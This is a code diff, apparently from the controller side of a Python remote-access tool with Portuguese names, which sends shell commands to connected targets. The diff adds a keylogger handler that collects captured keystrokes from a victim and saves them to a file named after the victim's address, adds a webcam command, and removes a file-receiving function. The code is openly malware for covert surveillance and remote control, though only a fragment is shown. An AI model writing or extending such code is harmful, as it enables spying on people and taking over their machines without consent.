@@ -56,12 +56,6 @@ def salvar_arquivo(mensagem,dir):
         arquivo.writelines(mensagem)
         arquivo.close()
 
-def receber_arquivo(conn,dir):
-    arquivo = open(dir, "wb")
-    data = conn.recv(2048)
-    arquivo.writelines(data)
-    arquivo.close()
-
 def registro_conexoes(conn,addr):
     now = datetime.now()
     dt_string = now.strftime("%d/%m/%Y %H:%M:%S")
@@ -81,11 +75,21 @@ def send_recv_padrao(conn,shell_):
     print("\n{}".format(output.decode()))
     return(output_)
 
-def send_recv_keylogger(conn,shell_):
+# ========= FUNCAO DO KEYLOGGER =========
+def keylogger(conn,addr,shell_):
     conn.send(shell_.encode())
     output = conn.recv(2048)
+    v1 = str(output.decode())
+    v2 = v1.strip('[]')
+    v3 = v2.strip("''")
+    v4 = 'Resultado do keylogger: {}'.format(v3)
     mensagem = "\nKeylogger concluido com sucesso, foram capturadas {}".format(len(output))
     print(mensagem)
+    salvar_arquivo(v4,addr)
+
+# ========= FUNCAO DE WEBCAM =========
+def webcam(conn,addr,shell_):
+    conn.send(shell_.encode())
 
 # ========= FUNCOES DE CONTROLE =========
 def painel_controle(lista_addr, lista_clientes):
@@ -134,8 +138,10 @@ def alvo(conn,addr):
             ajuda_alvo()
 
         elif(shell_.upper() == "KEYLOGGER"):
-            send_recv_keylogger(conn,shell_)
+            keylogger(conn,addr,shell_)
 
+        elif(shell_.upper() == "WEBCAM"):
+            webcam(conn,addr,shell_)
 
         else:
             output_ = send_recv_padrao(conn,shell_)
